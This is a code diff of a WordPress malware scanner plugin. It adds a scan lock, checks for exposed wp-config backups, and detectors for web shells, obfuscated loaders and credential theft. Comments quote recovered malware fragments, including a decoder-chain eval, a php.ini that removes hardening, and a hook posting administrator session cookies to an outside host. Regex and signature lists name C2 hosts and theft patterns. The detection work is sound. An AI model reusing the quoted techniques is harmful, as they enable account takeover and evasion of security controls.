@@ -13,14 +13,23 @@ class WPS_Scanner {
 	 * Known variants: v1.2.4 (XOR 60), v1.2.19 (XOR 113), v1.2.66 (XOR 84), v1.2.97 (XOR 114)
 	 */
 	private const SIGNATURES_PERF = [
-		// Polygon RPC endpoints (C2 relay)
-		'polygon.drpc.org',
-		'polygon-bor-rpc.publicnode',
-		'polygon.lava.build',              // confirmed v1.2.19/1.2.66/1.2.97 builds
-		'polygon.rpc.subquery.network',
-		'polygon-public.nodies.app',
-		'polygon-pokt.nodies.app',
-		'polygod.network',                 // NEW v1.2.1: alternate endpoint in v1.2.4 proto build
+		// 1.4.55: the public Polygon RPC hostnames used to live here, and this
+		// list is single-match and critical. A legitimate NFT or wallet plugin
+		// calling polygon.drpc.org - which is what that endpoint is for - was
+		// therefore reported as ClickFix malware and offered for deletion.
+		// Verified against a fixture: a plain web3 plugin tripped this on the
+		// hostname alone.
+		//
+		// The endpoints have moved to WPS_Indicators::etherhiding_indicators(),
+		// where every consumer requires corroboration: the option-key shape in
+		// check_clickfix_c2_in_options(), and a third independent signal in
+		// check_etherhiding_resolver(). Real samples in this family carry a
+		// dozen other entries from this list, so nothing that was detected
+		// stops being detected.
+		//
+		// Same reasoning as 1.4.40 over Wordfence: a scanner that flags
+		// legitimate software teaches its operator to ignore it, and then it
+		// protects nobody.
 		// Render-hijacker variants discovered May 2026.
 		'native-render-toolkit',
 		'total-render-profiler',
@@ -62,7 +71,8 @@ class WPS_Scanner {
 		'_wp_perf_ok',
 		'_cf_verified',
 		// Contract interaction
-		'eth_call',
+		// 1.4.55: 'eth_call' removed for the same reason - it appears in every
+		// web3 library in existence and cannot be a single-match malware signal.
 		'38bcdc1c',
 		'0x08207B087F61d7',
 		// ClickFix message handlers (fake Cloudflare verification)
@@ -383,6 +393,49 @@ class WPS_Scanner {
 			}
 		}
 
+		// 1.4.60 (CRIT-004): single-flight. Nothing previously stopped the
+		// hourly cron, a manual scan and a post-upgrade scan from running at
+		// once, each of them entitled to quarantine or delete. Two workers
+		// remediating the same finding is how one acts on a path the other has
+		// already moved.
+		//
+		// Acquisition is atomic - an INSERT that either creates the row or
+		// fails - because a read-then-set transient is not a lock: two workers
+		// can both read "free" before either writes.
+		$lock_token = null;
+		if ( class_exists( 'WPS_Scan_Lock' ) ) {
+			$lock_token = WPS_Scan_Lock::acquire( $force ? 'manual' : 'scheduled' );
+			if ( $lock_token === null ) {
+				$held = WPS_Scan_Lock::describe();
+				WPS_Logger::write(
+					'scan skipped: another scan holds the lock (context='
+					. (string) ( $held['context'] ?? '?' ) . ', age=' . (int) ( $held['age'] ?? 0 ) . 's)'
+				);
+				$cached = get_transient( 'wps_scan_results' );
+				return is_array( $cached ) ? $cached : [];
+			}
+		}
+
+		try {
+			return self::run_locked( $force );
+		} finally {
+			// finally, so a fatal inside the scan cannot strand the lock for
+			// its full TTL.
+			if ( $lock_token !== null ) {
+				WPS_Scan_Lock::release( $lock_token );
+			}
+		}
+	}
+
+	/**
+	 * The scan body. Split from run() in 1.4.60 so lock acquisition and release
+	 * bracket it without indenting nine hundred lines.
+	 *
+	 * @param bool $force Whether this is a forced (manual) scan.
+	 * @return array<int, array<string, mixed>>
+	 */
+	private static function run_locked( bool $force = false ): array {
+
 		// 1.3.98: every check runs through a wall-clock budget. On constrained
 		// hosts a full sweep can outlast max_execution_time and die mid-scan with
 		// nothing cached and nothing reported; the budget instead stops STARTING
@@ -404,6 +457,7 @@ class WPS_Scanner {
 			'check_wp_content_dropins' => [ __CLASS__, 'check_wp_content_dropins' ], // detect root drop-in persistence loaders
 			'check_wp_config_malware' => [ __CLASS__, 'check_wp_config_malware' ], // detect removable wp-config.php malware injections
 			'check_wp_config_integrity' => [ __CLASS__, 'check_wp_config_integrity' ], // detect wp-config.php modification
+			'check_exposed_config_backup' => [ __CLASS__, 'check_exposed_config_backup' ], // 1.4.55: readable wp-config copies in the web root
 			'check_htaccess_false_security' => [ __CLASS__, 'check_htaccess_false_security' ], // .htaccess-blocked but still-active malware
 			'check_htaccess_redirects' => [ __CLASS__, 'check_htaccess_redirects' ], // referer/UA-cloaked external redirects (doorway cloaking)
 			'check_c2_references' => [ __CLASS__, 'check_c2_references' ], // 1.3.98: unified sweep for any catalogued C2 domain in PHP content (shape-agnostic)
@@ -419,6 +473,15 @@ class WPS_Scanner {
 			'check_redrop' => [ __CLASS__, 'check_redrop' ], // 1.3.42: redrop detection - flag previously-deleted byte-identical malware that has reappeared
 			'check_dropper_cache' => [ __CLASS__, 'check_dropper_cache' ], // 1.3.43: hunt for cached toolkit ZIPs and loose dropper components anywhere in wp-content/
 			'check_well_known_php' => [ __CLASS__, 'check_well_known_php' ],
+			'check_credential_exfiltration' => [ __CLASS__, 'check_credential_exfiltration' ], // 1.4.41: what leaves the site
+			'check_php_in_data_directory' => [ __CLASS__, 'check_php_in_data_directory' ], // 1.4.40: location is evidence
+			'check_character_built_identifiers' => [ __CLASS__, 'check_character_built_identifiers' ], // 1.4.39: names spelled out of a haystack string
+			'check_self_extracting_payload' => [ __CLASS__, 'check_self_extracting_payload' ], // 1.4.37: reads itself, runs what follows its closing tag
+			'check_obfuscated_js_payload' => [ __CLASS__, 'check_obfuscated_js_payload' ], // 1.4.36: obfuscated JS carried inside PHP
+			'check_hidden_identifiers' => [ __CLASS__, 'check_hidden_identifiers' ], // 1.4.35: names split across concatenation to defeat search
+			'check_hardening_bypass_config' => [ __CLASS__, 'check_hardening_bypass_config' ], // 1.4.34: php.ini dropped to re-enable exec and remove open_basedir
+			'check_encoded_payload_loader' => [ __CLASS__, 'check_encoded_payload_loader' ], // 1.4.34: eval() behind a chain of split-name decoders
+			'check_unauthenticated_file_manager' => [ __CLASS__, 'check_unauthenticated_file_manager' ], // 1.4.33: plain-text web shell, no obfuscation to find
 			'check_doorway_cloaking' => [ __CLASS__, 'check_doorway_cloaking' ], // 1.4.25: serves crawlers different content than the owner
 			'check_control_flow_flattening' => [ __CLASS__, 'check_control_flow_flattening' ], // 1.4.25: goto-density obfuscation // 1.3.44: hunt for PHP files under .well-known/ (none of the IETF protocols using .well-known are PHP)
 			'check_generic_webshell_patterns' => [ __CLASS__, 'check_generic_webshell_patterns' ], // 1.3.46: high-confidence webshell pattern detection (eval/assert with user input, RFI, /e modifier)
@@ -432,6 +495,7 @@ class WPS_Scanner {
 			'check_clickfix_shape_heuristic' => [ __CLASS__, 'check_clickfix_shape_heuristic' ], // 1.3.58: shape-based detection of fake-plugin-folder ClickFix variants  catches new prefixes without per-prefix IoC entries
 			'check_plugin_metadata_camouflage' => [ __CLASS__, 'check_plugin_metadata_camouflage' ], // 1.3.75: flag plugins whose header carries an example.com placeholder URI (GoDaddy fake-plugin tell)
 			'check_malicious_db_options' => [ __CLASS__, 'check_malicious_db_options' ],
+			'check_injected_spam_content' => [ __CLASS__, 'check_injected_spam_content' ], // 1.4.73: casino/gambling/SEO-spam published into wp_posts and wp_comments
 			'check_clickfix_c2_in_options' => [ __CLASS__, 'check_clickfix_c2_in_options' ], // 1.3.69: recover ClickFix C2 download URL from wp_<10hex>_cfg option payloads
 			'check_obfuscated_loader' => [ __CLASS__, 'check_obfuscated_loader' ], // 1.3.78: structural (var-name/key-agnostic) detection of the XOR+base64 self-decoding ClickFix loader, with base64+XOR-brute payload recovery
 			'check_obfuscated_js_injector' => [ __CLASS__, 'check_obfuscated_js_injector' ], // 1.3.79: structural detection of the RC4-obfuscated JS injector / theme-css.js dropper family (Plugin-<8hex> naming, ENDPLUGINJS heredoc, css.js planted in theme dir)
@@ -442,6 +506,7 @@ class WPS_Scanner {
 			'check_external_payload_loader' => [ __CLASS__, 'check_external_payload_loader' ], // 1.3.83: plugins that read+decode+eval a bundled non-PHP payload blob (externalized-payload fake plugins, e.g. page-image-scanner / storage/state.pkg)
 			'check_doorway_backdoor_kit' => [ __CLASS__, 'check_doorway_backdoor_kit' ], // 1.3.83: standalone doorway-spam + backdoor panel kit (annealing/resweep family), detected by core/ structural tells and removed with a protected-path guard
 			'check_doorway_cloak_config' => [ __CLASS__, 'check_doorway_cloak_config' ], // 1.4.1: find the kit by its cloaking config - survives folder/file renaming, which the structural tells do not
+			'check_etherhiding_resolver' => [ __CLASS__, 'check_etherhiding_resolver' ], // 1.4.55: on-chain C2 resolution by technique - the endpoint host list cannot enumerate per-customer RPC subdomains
 			'check_obfuscated_goto_backdoor' => [ __CLASS__, 'check_obfuscated_goto_backdoor' ], // 1.4.3: control-flow-flattened packers - no signature can match them, so the technique is detected
 			'check_index_stub_anomaly' => [ __CLASS__, 'check_index_stub_anomaly' ],             // 1.4.3: payloads hidden in 'Silence is golden' index.php stubs, obfuscated or not
 			'check_file_manager_shell' => [ __CLASS__, 'check_file_manager_shell' ],     // 1.4.1: browser file-manager web shells (Tiny File Manager shape) - unobfuscated, so the generic webshell check never saw them
@@ -456,8 +521,11 @@ class WPS_Scanner {
 
 		$findings = [];
 		$skipped  = [];
+		// 1.4.46: published so the long-running checks can test it themselves.
+		$GLOBALS['wps_scan_started'] = $budget_start;
+		self::start_deadline();
 		foreach ( $checks as $label => $cb ) {
-			if ( ( microtime( true ) - $budget_start ) > self::SCAN_TIME_BUDGET_SECONDS ) {
+			if ( self::out_of_time() ) {
 				$skipped[] = $label;
 				continue;
 			}
@@ -470,7 +538,7 @@ class WPS_Scanner {
 				'type'     => 'scan_budget_exhausted (partial scan)',
 				'subject'  => count( $skipped ) . ' of ' . count( $checks ) . ' checks skipped',
 				'path'     => '',
-				'action'   => 'The scan hit its ' . self::SCAN_TIME_BUDGET_SECONDS . 's time budget and skipped: '
+				'action'   => 'The scan hit its ' . round( self::scan_budget_seconds() ) . 's time budget and skipped: '
 					. implode( ', ', $skipped ) . '. Findings above are real but the scan is not complete. '
 					. 'Run a manual scan from the Overview tab when the site is quieter; skipped checks run then.',
 			];
@@ -486,6 +554,19 @@ class WPS_Scanner {
 		}
 		if ( class_exists( 'WPS_Quarantine' ) ) {
 			WPS_Quarantine::purge_expired(); // 1.3.94: retention cleanup on the hourly scan
+		}
+
+		// 1.4.42: collapse duplicates for display.
+		//
+		// Deliberately AFTER auto_remediate(). A re-drop kit puts the same file
+		// in a dozen directories, and the remediator has to see all twelve to
+		// remove all twelve - grouping first would leave eleven copies on disk
+		// and report the job done.
+		$findings = self::group_duplicate_findings( $findings );
+
+		// 1.4.47: the normalisation cache is scan-scoped; let it go.
+		if ( class_exists( 'WPS_Utils' ) ) {
+			WPS_Utils::clear_normalised_cache();
 		}
 
 		set_transient( 'wps_scan_results', $findings, HOUR_IN_SECONDS );
@@ -1867,6 +1948,106 @@ class WPS_Scanner {
 		return [];
 	}
 
+	/**
+	 * 1.4.55: configuration backups sitting in the web root.
+	 *
+	 * `wp-config.php` is the one file whose disclosure is immediately fatal:
+	 * database credentials, table prefix, and every authentication salt. PHP
+	 * protects it by executing it, so a request returns nothing. Rename it to
+	 * anything the server does not parse as PHP and that protection is gone -
+	 * `wp-config.php.bak` is served as plain text.
+	 *
+	 * These come from editors (`~`, `.swp`), from host and panel backup
+	 * features, from developers working quickly, and - until 1.4.55 - from WP
+	 * Perf Shield's own hardening routine, which wrote `wp-config.php.wps.bak`
+	 * beside the original every time it edited the file. Upgrading stops new
+	 * ones appearing; it cannot remove those already there, so they are
+	 * reported.
+	 *
+	 * Only files that actually contain credentials are reported. A name that
+	 * merely looks like a config backup is not evidence, and a scanner that
+	 * cries wolf over an empty `wp-config.php.bak` teaches operators to ignore
+	 * it.
+	 *
+	 * @return array<int, array<string, string>>
+	 */
+	private static function check_exposed_config_backup(): array {
+		$found = [];
+		$root  = rtrim( ABSPATH, '/\\' );
+		if ( ! is_dir( $root ) ) {
+			return $found;
+		}
+
+		$entries = @scandir( $root );
+		if ( ! is_array( $entries ) ) {
+			return $found;
+		}
+
+		foreach ( $entries as $name ) {
+			if ( $name === '.' || $name === '..' ) {
+				continue;
+			}
+			if ( stripos( $name, 'wp-config' ) === false ) {
+				continue;
+			}
+			$lower = strtolower( $name );
+			if ( $lower === 'wp-config.php' || $lower === 'wp-config-sample.php' ) {
+				continue;
+			}
+			if ( substr( $lower, -4 ) === '.php' ) {
+				continue; // still parsed by the server, so not disclosed this way
+			}
+
+			$path = $root . DIRECTORY_SEPARATOR . $name;
+			if ( ! is_file( $path ) ) {
+				continue;
+			}
+			if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) {
+				continue;
+			}
+
+			$size = @filesize( $path );
+			if ( $size === false || $size < 64 || $size > 1048576 ) {
+				continue;
+			}
+
+			$head = @file_get_contents( $path, false, null, 0, 65536 );
+			if ( $head === false ) {
+				continue;
+			}
+
+			// Confirm it holds real secrets before calling it an exposure.
+			$secrets = 0;
+			foreach ( [ 'DB_NAME', 'DB_USER', 'DB_PASSWORD', 'AUTH_KEY', 'SECURE_AUTH_KEY', 'LOGGED_IN_KEY', 'NONCE_KEY', 'AUTH_SALT' ] as $needle ) {
+				if ( strpos( $head, $needle ) !== false ) {
+					$secrets++;
+				}
+			}
+			if ( $secrets < 2 ) {
+				continue;
+			}
+
+			$ours = ( stripos( $name, '.wps.bak' ) !== false || stripos( $name, '.wps-clean.bak' ) !== false );
+
+			$found[] = [
+				'severity' => 'critical',
+				'type'     => 'Readable wp-config backup in the web root - database credentials and salts are exposed',
+				'subject'  => $name,
+				'path'     => $path,
+				'action'   => 'Move this file out of the web root or delete it now. '
+					. 'Because it may already have been fetched, treat the credentials as disclosed: '
+					. 'change the database password and rotate the salts (Hardening, then Rotate salts).'
+					. ( $ours
+						? ' This file was written by WP Perf Shield hardening before 1.4.55, which is fixed - backups now go to quarantine. Deleting it is safe: the constants it protected are already in wp-config.php.'
+						: '' ),
+				'match'    => $secrets . ' credential constants in a file the web server will serve as text ('
+					. size_format( (int) $size ) . ')',
+			];
+		}
+
+		return $found;
+	}
+
 	/** @return array<int, array<string, string>> */
 	private static function check_wp_config_malware(): array {
 		if ( ! class_exists( 'WPS_Hardening' ) ) {
@@ -2732,7 +2913,20 @@ class WPS_Scanner {
 	 * 45s sits under the common 60s max_execution_time with headroom for
 	 * auto-remediation and caching after the checks finish.
 	 */
+	/**
+	 * Ceiling for the scan's own time budget.
+	 *
+	 * 1.4.46: this used to BE the budget, at a flat 45 seconds. On a host
+	 * where max_execution_time is 30 that is a guaranteed fatal - the scan's
+	 * self-imposed limit sits above the limit PHP kills it at, so it can never
+	 * stop itself in time and the fail-safe catches a timeout instead. It is
+	 * now a ceiling, and the effective budget is derived from what PHP will
+	 * actually allow. See scan_budget_seconds().
+	 */
 	const SCAN_TIME_BUDGET_SECONDS = 45;
+
+	/** Never leave less than this for the rest of the request. */
+	const SCAN_BUDGET_HEADROOM = 8;
 
 	// 1.3.87: PHP-inventory drift tripwire. Extensions PHP will execute, and the
 	// option that stores the clean baseline (realpath => sha256). Autoload off.
@@ -3191,6 +3385,1310 @@ class WPS_Scanner {
 	 * legitimate bot-detection or caching plugin does; paired with a
 	 * search-referrer test or with log suppression, it is cloaking.
 	 */
+	/**
+	 * 1.4.33: an unauthenticated file manager - the plain-text web shell.
+	 *
+	 * Every content detector in this scanner before now looked for hiding:
+	 * hex escapes, base64, control-flow flattening. A live sample recovered
+	 * from an infected site scored zero on all of them, because it was not
+	 * hiding at all. It was a hundred and fifty lines of clean, readable PHP
+	 * that uploaded, edited, renamed and deleted any file on the server, and
+	 * listed any directory, with no password and no WordPress at all.
+	 *
+	 * It did not need to hide, because nothing was looking for code that
+	 * simply asks to be run. Obfuscation is a tactic, not a definition, and a
+	 * scanner that only knows how to spot concealment will miss the shells
+	 * that never bothered.
+	 *
+	 * The technique this matches is the thing itself rather than its disguise:
+	 * a file that does not load WordPress, checks no capability, nonce,
+	 * password or session, and yet performs several different filesystem
+	 * mutations driven by request input. There is no benign version of that
+	 * combination - at best it is a plugin author's utility script that
+	 * anyone on the internet can use to overwrite files, which needs removing
+	 * just as urgently as a shell does.
+	 */
+	/**
+	 * 1.4.34: a PHP payload hidden behind a chain of decoders.
+	 *
+	 * The pattern, from a live sample:
+	 *
+	 *     $a = 'base'.'64'.'_'.'decode';  $b = 'gzinflat'.'e';
+	 *     $c = 'st'.'r'.'_rot'.'13';      $d = 's'.'trrev';
+	 *     eval( $d( $c( $b( $a( '<twenty kilobytes of base64>' ) ) ) ) );
+	 *
+	 * Two evasions at once. The decoder names are split across concatenation
+	 * so a grep for `base64_decode` finds nothing, and they are then called
+	 * through variables so a search for `base64_decode(` finds nothing either.
+	 * The existing loader check does not help: it was written for JavaScript
+	 * and wants atob, charCodeAt and TextDecoder together.
+	 *
+	 * Matching is done after `deobfuscate_literals()`, which rejoins the split
+	 * names, and on the NAME rather than on a call - because the whole point
+	 * of the technique is that the name is never adjacent to its bracket.
+	 *
+	 * Requiring an execution sink, two or more decoders and a substantial
+	 * encoded literal together is what keeps this quiet: a minifier or a
+	 * legitimate cache file may have one of those, never all three.
+	 */
+	/**
+	 * 1.4.34: configuration files dropped to weaken the server.
+	 *
+	 * Everything this scanner reads is PHP. A kit recovered from a live site
+	 * was a third configuration: six identical php.ini files and seven
+	 * .htaccess files, sitting beside the shells and completely unexamined,
+	 * because they are not code and nothing was looking at them.
+	 *
+	 * The php.ini read:
+	 *
+	 *     safe_mode = Off        disable_functions = NONE
+	 *     open_basedir = OFF     exec = ON      shell_exec = ON
+	 *
+	 * On CGI and FastCGI a per-directory php.ini is honoured, so that file
+	 * re-enables the exact functions a host disables to contain a break-in,
+	 * and removes the directory jail meant to keep one contained. It is not a
+	 * payload; it is the thing that makes the next payload work.
+	 *
+	 * The .htaccess files re-allow direct access to php and shell scripts in
+	 * directories where a host had denied it.
+	 *
+	 * Only files this plugin's own directory does not own are examined, and
+	 * only settings with no legitimate reason to be relaxed are matched.
+	 */
+	/**
+	 * 1.4.35: names deliberately hidden from a search.
+	 *
+	 * The sharpest signal in the samples recovered so far, and the simplest.
+	 * A plugin calling itself "Native Image Optimizer" - correct header,
+	 * ABSPATH guard, uninstall routine, licence, translation template - was
+	 * invisible to every check here. It had no eval, no goto, no encoded
+	 * blob in any PHP file, and did not touch the filesystem. Its payload sat
+	 * in resources/config.bin behind a custom container, so a scanner reading
+	 * only PHP had nothing to read.
+	 *
+	 * What it could not hide was the shape of its own evasion. Every
+	 * meaningful identifier was split across string concatenation:
+	 *
+	 *     'HTTP'.'_USER_A'.'GENT'      'wp'.'_foo'.'ter'
+	 *     'g'.'oogl'.'ebot'            'cr'.'aw'.'l'
+	 *
+	 * Rejoining those - which deobfuscate_literals() already does - reveals
+	 * thirteen sensitive names that a plain search of the file finds nowhere.
+	 *
+	 * That gap IS the finding. There is no reason to write a function name in
+	 * pieces except to defeat the search someone will run for it, and the
+	 * measurement is unambiguous: thirteen hidden names in the sample, and
+	 * zero across seventy-nine files of real theme and plugin code.
+	 *
+	 * The names it hides also say what it does. A file concealing googlebot,
+	 * crawl, spider and lighthouse alongside is_user_logged_in and
+	 * administrator is choosing an audience, and the audience it is avoiding
+	 * is search engines and whoever owns the site.
+	 */
+	/**
+	 * 1.4.36: obfuscated JavaScript carried inside a PHP file.
+	 *
+	 * A sample styled as "simple js plugin" - correct header, ABSPATH guard,
+	 * one file - produced nothing against any check here. Its PHP was clean
+	 * and readable throughout. What it carried was a heredoc holding a single
+	 * line of a hundred and eleven thousand bytes of obfuscated JavaScript,
+	 * printed into wp_footer.
+	 *
+	 * Nothing was looking, because every content check reasons about PHP. The
+	 * PHP in this file is not the malware; it is the envelope.
+	 *
+	 * The signal is the naming that javascript-obfuscator leaves behind. It
+	 * renames every identifier to a hexadecimal token - _0x4f78, _0x54f1d9 -
+	 * and there were four thousand nine hundred of them here, against zero
+	 * across eighty-three files of real theme and plugin code, a legitimate
+	 * eighty-kilobyte minified bundle among them.
+	 *
+	 * Line length was considered as a signal and rejected: that same minified
+	 * bundle is one line of eighty thousand bytes, and minification is not
+	 * obfuscation. Renaming everything to hex is.
+	 */
+	/**
+	 * 1.4.37: a file that reads itself and executes what follows its own
+	 * closing tag.
+	 *
+	 * The mechanism, from a recovered sample:
+	 *
+	 *     $p = explode( base64_decode( 'Pz4=' ), file_get_contents( __FILE__ ) );
+	 *     ... base64_decode( strrev( str_rot13( $p[1] ) ) ) ...
+	 *     preg_replace( $a, serialize( @eval( $payload ) ), $b ); exit();
+	 *     ?>==Dstfmoz5...sixteen kilobytes of encoded data...
+	 *
+	 * `Pz4=` is `?>`. The file splits itself on its own closing tag and runs
+	 * whatever comes after it. The payload is therefore not in a string
+	 * literal, not in any variable, and not even inside the PHP block - which
+	 * is why the decoder-chain check found nothing to match.
+	 *
+	 * Detection is the combination rather than any part: a file reading its
+	 * own path, an execution sink, and a substantial body of data past the
+	 * closing tag. Each alone is innocent; together they are a self-extracting
+	 * payload.
+	 *
+	 * IMPORTANT, and the reason this is rated high rather than critical:
+	 * commercial security and licensing products use this same technique to
+	 * stop their own code being read. A recovered sample carried a Monarx
+	 * copyright header. The finding therefore names the possibility, looks for
+	 * a vendor string, and tells the operator to confirm with their host
+	 * before deleting anything - because a scanner that removes the host's
+	 * own security agent has done more harm than the thing it was hunting.
+	 */
+	/**
+	 * 1.4.39: identifiers spelled out of another string, one character at a
+	 * time.
+	 *
+	 * The most careful evasion recovered so far. From a live sample:
+	 *
+	 *     $y = 'I could not have a more welcome visitor 64 group of zain bani';
+	 *     $f = $y[15] . $y[14] . $y[13] . $y[5] . '(' . $y[43] . $y[52] . ...
+	 *     eval( $f . 'eJyt/EnPrFxitQmPban...' );
+	 *
+	 * The sentence is innocuous and the function names never exist as text:
+	 * `gzuncompress` and `base64_decode` are assembled character by character
+	 * from indices into it, then the whole call is built as a string and run.
+	 *
+	 * Every check written before this one is blind to it, and each for a
+	 * different reason. Nothing is split across concatenation, so rejoining
+	 * literals finds nothing to rejoin and the hidden-identifier check sees no
+	 * change. No decoder name appears anywhere, so the decoder-chain check
+	 * counts zero. The goto density is seven, well under the flattening floor.
+	 * The payload is concatenated onto a built string rather than sitting in a
+	 * literal, so there is no encoded blob to match.
+	 *
+	 * What it cannot avoid is the construction itself. Spelling a name out of
+	 * a haystack takes one indexing expression per character, and they must be
+	 * concatenated in order. Twenty-eight such chains in the sample; the worst
+	 * case across a production theme and this plugin is three, which appear in
+	 * ordinary string handling.
+	 */
+	/**
+	 * 1.4.40: executable PHP in a directory that holds data.
+	 *
+	 * Every check before this one asks what a file contains. None asks where
+	 * it is, and location is evidence in its own right - often the strongest
+	 * available, because it needs no interpretation.
+	 *
+	 * A backdoor recovered from a live site sat in wp-content/fonts/. It is
+	 * gated behind a secret token, so it returns nothing at all to anyone who
+	 * does not already know it, and on content alone it rated only "high". But
+	 * a PHP file in the fonts directory is wrong before it is read.
+	 *
+	 * Two tiers, because the distinction matters. In uploads, fonts and the
+	 * upgrade scratch directory, nothing legitimate installs code and the
+	 * location alone is the finding. In caches, logs and backups, plugins do
+	 * write .php files, so something about the file must also be wrong.
+	 *
+	 * Files that are inert by construction are excluded outright. Wordfence
+	 * stores its logs as `<?php exit('Access denied'); __halt_compiler(); ?>`
+	 * followed by data - the extension stops anyone reading the file directly
+	 * while nothing in it ever runs. That is the correct way to hold data in a
+	 * web-reachable directory, and an earlier draft of this check reported it
+	 * as malware. Reporting a security plugin as an intrusion is the kind of
+	 * false positive that teaches an operator to ignore the scanner.
+	 */
+	/**
+	 * 1.4.41: credentials or session cookies sent to a hardcoded host.
+	 *
+	 * Every check in this scanner reasons about how code hides, or what it
+	 * writes to disk. None asks what leaves the site. A file recovered from a
+	 * live installation exposed that gap completely:
+	 *
+	 *     register_shutdown_function( function () {
+	 *         $u = wp_get_current_user();
+	 *         if ( ! in_array( 'administrator', (array) $u->roles ) ) return;
+	 *         foreach ( $_COOKIE as $n => $v )
+	 *             if ( strpos( $n, 'wordpress_' ) === 0 ) $c[] = "$n=$v";
+	 *         @wp_remote_post( 'https://webanalytics-cdn.sbs/k', [ ... ] );
+	 *     } );
+	 *
+	 * It is short, readable, unobfuscated PHP with a correct ABSPATH guard,
+	 * in a directory where PHP belongs, writing nothing to disk. Every content
+	 * check passed it, and each was right to by its own rules.
+	 *
+	 * What it does is wait for an administrator to log in and post that
+	 * administrator's session cookies to somebody else - which is complete
+	 * account takeover without a password, and invisible to a login guard
+	 * because no login ever fails.
+	 *
+	 * The rule is narrow on purpose. Sending data to a hardcoded host is
+	 * ordinary; plugins call their own APIs constantly. Sending SESSION
+	 * COOKIES or CREDENTIALS to one is not ordinary, and there is no version
+	 * of it that is legitimate.
+	 */
+	/**
+	 * 1.4.42: collapse findings that are the same file in different places.
+	 *
+	 * A re-drop kit plants one payload in a dozen directories under randomly
+	 * generated names, on the reasoning that whoever finds one will delete it
+	 * and stop looking. Reporting that honestly produces a dozen separate
+	 * criticals, identical but for a path - which buries every other finding
+	 * on the screen and still does not say the thing that matters, which is
+	 * that these are one intrusion and removing one achieves nothing.
+	 *
+	 * Grouping is by content rather than by name, because the names are the
+	 * part the attacker regenerates. Two files with the same hash flagged by
+	 * the same check are one finding with several locations.
+	 *
+	 * Three things are deliberately left alone. A file flagged by two
+	 * different checks stays as two findings, because they say different
+	 * things about it. A finding with no path is never grouped. And a file
+	 * that has since disappeared passes through untouched rather than being
+	 * silently dropped, since a scan result that quietly loses findings is
+	 * worse than one that repeats them.
+	 *
+	 * @param array<int, array<string, mixed>> $findings
+	 * @return array<int, array<string, mixed>>
+	 */
+	private static function group_duplicate_findings( array $findings ): array {
+		if ( count( $findings ) < 2 ) {
+			return $findings;
+		}
+
+		$buckets = [];
+		$passed  = [];
+
+		foreach ( $findings as $f ) {
+			$path = (string) ( $f['path'] ?? '' );
+			if ( '' === $path || ! @is_file( $path ) ) {
+				$passed[] = $f;
+				continue;
+			}
+			$hash = @md5_file( $path );
+			if ( false === $hash ) {
+				$passed[] = $f;
+				continue;
+			}
+			// Type as well as hash: one file caught by two checks is two facts.
+			$key = md5( (string) ( $f['type'] ?? '' ) ) . ':' . $hash;
+			$buckets[ $key ][] = $f;
+		}
+
+		$out = [];
+		foreach ( $buckets as $group ) {
+			if ( count( $group ) < 2 ) {
+				$out[] = $group[0];
+				continue;
+			}
+
+			$first = $group[0];
+			$paths = [];
+			foreach ( $group as $g ) {
+				$paths[] = self::display_path( (string) $g['path'] );
+			}
+			sort( $paths );
+			$n = count( $paths );
+
+			// The worst severity in the group governs the group.
+			$rank  = [ 'critical' => 4, 'high' => 3, 'medium' => 2, 'warning' => 2, 'low' => 1, 'info' => 0 ];
+			$worst = $first['severity'] ?? 'high';
+			foreach ( $group as $g ) {
+				if ( ( $rank[ $g['severity'] ?? '' ] ?? 0 ) > ( $rank[ $worst ] ?? 0 ) ) {
+					$worst = $g['severity'];
+				}
+			}
+
+			$shown  = array_slice( $paths, 0, 12 );
+			$more   = $n - count( $shown );
+			$list   = implode( ', ', $shown ) . ( $more > 0 ? ', and ' . $more . ' more' : '' );
+
+			$first['severity'] = $worst;
+			$first['subject']  = $n . ' identical copies: ' . $shown[0] . ( $n > 1 ? ' and ' . ( $n - 1 ) . ' other location(s)' : '' );
+			$first['paths']    = $paths;
+			$first['action']   = 'This same file is present in ' . $n . ' places: ' . $list . '. '
+				. 'They are byte-for-byte identical, so this is one intrusion rather than ' . $n . ' - the copies exist '
+				. 'precisely so that finding and deleting one changes nothing. Remove all of them together, and treat the '
+				. 'count as a measure of how thoroughly the site was reached rather than of how many separate problems '
+				. 'there are. ' . ( (string) ( $first['action'] ?? '' ) );
+
+			$out[] = $first;
+		}
+
+		return array_merge( $out, $passed );
+	}
+
+	private static function check_credential_exfiltration(): array {
+		$found    = [];
+		$self_dir = realpath( WPS_DIR ) ?: '';
+
+		$rx_out  = '/wp_remote_(?:post|get|request)\s*\(|curl_exec\s*\(|fsockopen\s*\(|file_get_contents\s*\(\s*[\'"]https?:/i';
+		$rx_host = '/[\'"]https?:\/\/([a-z0-9.-]+)/i';
+
+		// Only things that are never legitimately transmitted.
+		$sensitive = [
+			'/foreach\s*\(\s*\$_COOKIE\b/i'                 => 'every cookie the visitor holds',
+			'/wordpress_logged_in|wordpress_sec_/i'            => 'WordPress session cookies',
+			'/\$_COOKIE\s*\[\s*[\'"]wordpress/i'             => 'WordPress session cookies',
+			'/\$_POST\s*\[\s*[\'"](?:pwd|password|pass|log|user_login)[\'"]/i' => 'submitted login credentials',
+			'/user_pass\b/i'                                  => 'stored password hashes',
+			'/AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|DB_PASSWORD/i' => 'the site\'s secret keys',
+		];
+
+		// Hosts WordPress and common tooling legitimately talk to. A match
+		// here still needs sensitive data present, so this is belt and braces.
+		$known = [ 'api.wordpress.org', 'downloads.wordpress.org', 'wordpress.org', 'rest.akismet.com', 'akismet.com', 'gravatar.com', 'secure.gravatar.com', 'ps.w.org' ];
+
+		$roots = [ rtrim( ABSPATH, '/\\' ) ];
+		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
+			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
+		}
+
+		$count = 0;
+		$seen  = [];
+		foreach ( $roots as $root ) {
+			if ( ! is_dir( $root ) ) {
+				continue;
+			}
+			try {
+				$iter = new RecursiveIteratorIterator(
+					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
+					RecursiveIteratorIterator::LEAVES_ONLY
+				);
+				$iter->setMaxDepth( 6 );
+				foreach ( $iter as $f ) {
+					if ( self::out_of_time() ) {
+						break 2;
+					}
+					if ( ++$count > 8000 || self::scan_budget_exceeded() ) {
+						break 2;
+					}
+					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() || ! self::is_php_executable( $f ) ) {
+						continue;
+					}
